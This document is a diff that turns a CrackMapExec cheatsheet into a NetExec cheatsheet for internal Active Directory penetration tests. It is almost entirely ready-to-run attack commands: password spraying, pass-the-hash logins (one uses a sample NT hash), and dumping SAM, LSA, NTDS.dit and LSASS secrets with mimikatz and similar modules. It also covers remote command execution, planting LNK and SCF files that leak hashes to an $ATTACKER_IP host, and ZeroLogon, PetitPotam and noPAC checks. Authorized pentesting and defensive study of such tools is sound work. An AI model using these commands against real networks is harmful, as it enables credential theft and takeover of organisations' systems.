@@ -1,117 +1,153 @@
-# CME_cheatSheet
-A CheatSheet to use CrackMapExec, without lots of explications, only commands.
+# NetExec Cheatsheet
 
-Enumeration
-===========
-Network
--------
-`crackmapexec smb 10.0.0.0/24`
+[[_TOC_]]
 
-Shares
-------
-`cme smb 10.0.0.0 -u UserName -p 'PASS' --shares`
+A quick and dirty cheatsheet on the usage of [NetExec](https://github.com/Pennyw0rth/NetExec), without lots of explications, only commands. The purpose of this page is to provide the basic commands for the essential operations during an internal pentest.
 
-Sessions
---------
-`crackmapexec 10.0.0.0 -u UserName -p 'PASS' --sessions`
+If you need more detailed documentation, please refer to the [**official NetExec wiki**](https://www.netexec.wiki/).
 
-Disk
-----
-`cme smb 10.0.0.0 -u UserName -p 'PASS' --disks`
+And obviously, if you need more complete cheatsheets with most of the attacks to perform in Active Directory environments, take a look to [my other contents](https://hideandsec.sh/books/cheatsheets-82c).
 
-Users
------
-Logged
-`cme smb 192.168.1.0/24 -u UserName -p 'PASS' --loggedon-users`
+## Enumeration
 
-Domain
-`cme smb 192.168.1.0/24 -u UserName -p 'PASS' --users`
+### Network
 
-Via RID
-`cme smb 192.168.1.0/24 -u UserName -p 'PASS' --rid-brute`
+`netexec smb $TARGETS`
 
-Groups
--------
-Domain
-`cme smb 10.0.0.0 -u UserName -p 'PASS' --groups`
+### Shares
 
-Local
-`cme smb 10.0.0.0 -u UserName -p 'PASS' --local-groups`
+`netexec smb $TARGETS -u $USERNAME -p $PASS --shares`
 
-Password Policy
-===============
-`cme smb 10.0.0.0 -u UserName -p 'PASS' --pass-pol`
+### Specific files in shares
 
-Check creds
-===========
-User + pass
------------
-`cme smb 192.168.1.0/24 -u UserName -p 'PASS'`
+A module for searching network shares:spider_plus. Running the module without any options (on a /24, for example) will produce a JSON output for each server, containing a list of all files (and some info), but without their contents. Then grep on extensions (conf, ini...) or names ($PASS .. ) to identify an interesting file to search:
 
-User + hash
------------
-`#cme smb 192.168.1.0/24 -u UserName -H 'LM:NT'`
+`netexec smb $TARGETS -u $USERNAME -p $PASS -M spider_plus`
 
-`#cme smb 192.168.1.0/24 -u UserName -H 'NTHASH'`
+Then, when identifying a lot of interesting files, to speed up the search, dump this on the attacker machine by adding the -o READ_ONLY=False option after the -M spider_plus (but avoid /24, otherwise it'll take a long time). In this case, NetExec will create a folder with the machine's IP, and all the folders/files in it.
 
-`cme smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'`
+`netexec smb $TARGETS -u $USERNAME -p $PASS -M spider_plus -o READ_ONLY=False`
 
-`cme smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'`
+### Sessions
 
-Null session
-------------
-`cme smb 192.168.1.0/24 -u '' -p ''`
+`netexec $TARGETS -u $USERNAME -p $PASS --sessions`
 
-Lists
-------
-`cme smb 192.168.1.101 -u user1 user2 user3 -p Summer18`
+### Disk
 
-`cme smb 192.168.1.101 -u user1 -p password1 password2 password3`
+`netexec smb $TARGETS -u $USERNAME -p $PASS --disks`
 
-`cme smb 192.168.1.101 -u /path/to/users.txt -p Summer18`
+### Users
 
-`cme smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt`
+Logged : `netexec smb $TARGETS -u $USERNAME -p $PASS --loggedon-users`
 
+Domain : `netexec smb $TARGETS -u $USERNAME -p $PASS --users`
 
-`#To continue on a session after success`
+Via RID Cycling : `netexec smb $TARGETS -u $USERNAME -p $PASS --rid-brute`
 
-`cme smb 192.168.1.101 -u /path/to/users.txt -p Summer18 --continue-on-success`
+### Groups
 
-Local
---------
-`cme smb 192.168.1.0/24 -u UserName -p 'PASS' --local-auth`
+Domain : `netexec smb $TARGETS -u $USERNAME -p $PASS --groups`
 
-`cme smb 192.168.1.0/24 -u '' -p '' --local-auth`
+Local : `netexec smb $TARGETS -u $USERNAME -p $PASS --local-groups`
 
-`cme smb 192.168.1.0/24 -u UserName -H 'LM:NT' --local-auth`
+### Password policy
 
-`cme smb 192.168.1.0/24 -u UserName -H 'NTHASH' --local-auth`
+`netexec smb $DC -u $USERNAME -p $PASS --pass-pol`
 
-`cme smb 192.168.1.0/24 -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth`
+## Check credentials
 
-`cme smb 192.168.1.0/24 -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth`
+### User + pass
 
-Get creds
-=================
-SAM
----
-`cme smb 10.0.0.0 -u UserName -p 'PASS' --sam`
+`netexec smb $TARGETS -u $USERNAME -p $PASS`
 
-LSA
----
-`cme smb 10.0.0.0 -u UserName -p 'PASS' --lsa`
+### User + hash
 
-NTDS
-----
-`cme smb 10.0.0.0 -u UserName -p 'PASS' --ntds #Via RPC`
+`netexec smb $TARGETS -u $USERNAME -H 'LM:NT'`
 
-`cme smb 10.0.0.0 -u UserName -p 'PASS' --ntds vss #Via VSS`
+`netexec smb $TARGETS -u $USERNAME -H 'NTHASH'`
 
-Command execution
-======================
-Commands + Powershell commands
---------------------------------
-`crackmapexec 10.0.0.0 -u Administrator -p 'P@ssw0rd' -x whoami`
+### Null session
 
-`crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Commande powershell`
+`netexec smb $TARGETS -u '' -p ''`
 
+### Password spraying
+
+`netexec smb $TARGET -u $USERNAME user2 user3 -p Summer18`
+
+`netexec smb $TARGET -u $USERNAME -p $PASS1 $PASS2 $PASS3`
+
+`netexec smb $TARGET -u /path/to/users.txt -p Summer18`
+
+`netexec smb $TARGET -u $USERNAME -p /path/to/$PASSs.txt`
+
+To continue spraying after success :
+
+`netexec smb $TARGET -u /path/to/users.txt -p Summer18 --continue-on-success`
+
+### Local authentication
+
+`netexec smb $TARGETS -u $USERNAME -p $PASS --local-auth`
+
+## Dump credentials
+
+### SAM
+
+`netexec smb $TARGETS -u $USERNAME -p $PASS --sam`
+
+### LSA
+
+`netexec smb $TARGETS -u $USERNAME -p $PASS --lsa`
+
+### NTDS.dit
+
+`netexec smb $DC -u $USERNAME -p $PASS --ntds #Via RPC`
+
+`netexec smb $DC -u $USERNAME -p $PASS --ntds vss #Via VSS`
+
+### LSASS
+
+`netexec smb $TARGET -u $USERNAME -p $PASS -M lsassy`
+
+`netexec smb $TARGET -u $USERNAME -p $PASS -M nanodump`
+
+`netexec smb $TARGET -u $USERNAME -p $PASS -M mimikatz`
+
+`netexec smb $TARGET -u $USERNAME -p $PASS -M procdump`
+
+### LAPS password
+
+`netexec ldap $DC -u $TARGET -p $PASS -M laps -o computer=$TARGET`
+
+## Command execution
+
+### Via CMD
+
+`netexec $TARGET -u Administrator -p $PASS -x whoami`
+
+### Via PowerShell
+
+`netexec $TARGET -u Administrator -p $PASS -X '$PSVersionTable'`
+
+## Write a leak file
+
+### LNK
+
+`netexec smb $TARGETS -u $USERNAME -p $PASS -M slinky -o SERVER=$ATTACKER_IP -o NAME=<file_name>`
+
+### SCF
+
+`netexec smb $TARGETS -u $USERNAME -p $PASS -M scuffy -o SERVER=$ATTACKER_IP -o NAME=<file_name>`
+
+## Search for CVE
+
+### ZeroLogon
+
+`netexec smb $DC -u '' -p '' -M zerologon`
+
+### PetitPotam
+
+`netexec smb $DC -u '' -p '' -M petitpotam`
+
+### noPAC
+
+`netexec smb $DC -u $USERNAME -p $PASS -M nopac`
